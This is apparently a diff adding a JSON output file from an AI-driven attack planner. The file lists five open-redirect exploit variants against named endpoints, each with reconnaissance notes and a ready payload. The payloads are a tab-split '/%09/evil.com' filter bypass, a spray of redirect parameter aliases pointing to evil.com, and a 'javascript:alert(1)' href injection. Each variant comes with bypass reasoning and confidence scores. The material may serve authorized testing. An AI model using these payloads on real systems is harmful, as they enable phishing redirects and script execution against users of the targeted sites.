@@ -1,0 +1,68 @@
+{
+ "key": "open_redirect_2",
+ "model": "opencode/mimo-v2.6-flash-free",
+ "class": "open_redirect",
+ "variants": [
+  {
+   "endpoint": "GET /account/continue",
+   "target_param": "return_to",
+   "recon_evidence": "The app rejects any value containing '//' after the scheme, but a request with a literal tab (%09) between the slashes still returns 302 Location echoing the value unchanged.",
+   "planner_rationale": "The tab between the slashes survives validation because the adjacency check never sees '//' together, then normalization removes %09 and the slashes re-form.",
+   "vuln_class": "open_redirect",
+   "payload": "/%09/evil.com",
+   "injection_point": "query",
+   "expected_success_signal": "302 Location header resolves to //evil.com once the tab is stripped during normalization",
+   "confidence": 0.88,
+   "reasoning": "The observed filter blocks adjacent slashes while accepting encoded whitespace, so %09 smuggles the break past the check and is removed during canonicalization, restoring the protocol-relative redirect to evil.com."
+  },
+  {
+   "endpoint": "POST /auth/callback/resolve",
+   "target_param": "dest",
+   "recon_evidence": "Source review shows the handler reads several fallback keys (url, next, redirect, redir, rurl, redirect_uri) into one destination variable, and only one of them is actually honored per request; the documented 'dest' key is dead.",
+   "planner_rationale": "Spray every known alias in a single request so the first honored key reveals itself without iterative probing.",
+   "vuln_class": "open_redirect",
+   "payload": "?url=https://evil.com&next=https://evil.com&redirect=https://evil.com&redir=https://evil.com&rurl=https://evil.com&redirect_uri=https://evil.com",
+   "injection_point": "query",
+   "expected_success_signal": "Response 302s to https://evil.com via whichever alias the resolver consumes first",
+   "confidence": 0.82,
+   "reasoning": "Because the handler merges multiple aliases into one destination slot, supplying all of them at once guarantees the live key is populated and exposes the redirect in a single probe."
+  },
+  {
+   "endpoint": "GET /news/share?link=",
+   "target_param": "link",
+   "recon_evidence": "The parameter value is rendered into an anchor tag's href on the share preview page with no scheme allow-list, and no server-side 302 is issued for external hosts.",
+   "planner_rationale": "Since navigation happens client-side from a stored href, a script scheme converts the open redirect into in-page script execution.",
+   "vuln_class": "open_redirect",
+   "payload": "javascript:alert(1)",
+   "injection_point": "query",
+   "expected_success_signal": "Clicking the rendered share link runs alert(1) in the origin of the hosting page",
+   "confidence": 0.9,
+   "reasoning": "An unsanitized href sink executes the javascript: scheme on click, which is exactly the JS-variant family for open redirects that never leave the page via HTTP redirect."
+  },
+  {
+   "endpoint": "GET /sso/redirect?to=",
+   "target_param": "to",
+   "recon_evidence": "Slash-filtering is active (values with '//' return 400), but a probe containing an encoded tab between the slashes is accepted and echoed verbatim into the Location header.",
+   "planner_rationale": "Split the filtered double slash with a character that normalization silently deletes so validation and final URL disagree.",
+   "vuln_class": "open_redirect",
+   "payload": "/%09/evil.com",
+   "injection_point": "query",
+   "expected_success_signal": "Location header normalizes to //evil.com and the browser navigates off-site to evil.com",
+   "confidence": 0.86,
+   "reasoning": "The 400 on raw '//' versus acceptance of the tab-separated form shows the filter runs pre-normalization, so stripping %09 at redirect time reconstructs the blocked protocol-relative URL."
+  },
+  {
+   "endpoint": "GET /logout?next=",
+   "target_param": "next",
+   "recon_evidence": "Behavioral tests show the logout flow honours whichever redirect key is present, with 'next' working in some flows while 'redirect' and 'url' work in others; no single name is documented as canonical.",
+   "planner_rationale": "Cover all common redirect parameter names together to find the live one when recon is ambiguous about naming.",
+   "vuln_class": "open_redirect",
+   "payload": "?url=https://evil.com&next=https://evil.com&redirect=https://evil.com&redir=https://evil.com&rurl=https://evil.com&redirect_uri=https://evil.com",
+   "injection_point": "query",
+   "expected_success_signal": "At least one parameter is consumed and the post-logout response 302s to https://evil.com",
+   "confidence": 0.78,
+   "reasoning": "With multiple candidate names routing to the same variable and no canonical key identified, a combined probe identifies the accepted parameter in one request while confirming the redirect sink."
+  }
+ ],
+ "raw_tail": "  \"expected_success_signal\": \"At least one parameter is consumed and the post-logout response 302s to https://evil.com\",\n    \"confidence\": 0.78,\n    \"reasoning\": \"With multiple candidate names routing to the same variable and no canonical key identified, a combined probe identifies the accepted parameter in one request while confirming the redirect sink.\"\n  }\n]\n\u001b[0m\n> build · mimo-v2.6-flash-free\n"
+}
